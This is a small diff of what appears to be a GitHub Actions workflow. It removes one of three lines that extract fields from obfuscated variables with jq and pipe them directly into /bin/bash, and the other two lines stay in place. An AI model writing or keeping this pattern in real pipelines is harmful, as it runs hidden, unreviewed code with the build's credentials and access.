@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$do557" | jq -r .dhjo3317 | /bin/bash
           printf '%s' "$lb1" | jq -r .x72 | /bin/bash
-          echo $r4 | jq -r .db73515 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
